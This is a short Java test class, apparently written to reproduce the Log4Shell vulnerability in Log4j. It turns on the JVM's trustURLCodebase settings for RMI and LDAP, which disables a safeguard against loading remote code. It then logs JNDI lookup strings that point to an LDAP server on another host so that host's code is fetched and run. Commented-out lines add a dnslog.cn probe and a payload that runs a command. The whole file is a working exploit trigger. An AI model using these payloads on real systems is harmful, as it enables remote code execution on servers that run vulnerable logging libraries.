package com.example.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TestLog4j {
    public static final Logger logger =   LogManager.getLogger(TestLog4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        // System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        // System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        // logger.error( "${jndi:ldap://9dyoan.dnslog.cn}");
        // 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
        // logger.error("${jndi:ldap://192.168.15.113:1389/Basic/Command/calc}");
        logger.error("${jndi:ldap://192.168.15.253:1389/5zcgjy}");
    }
}
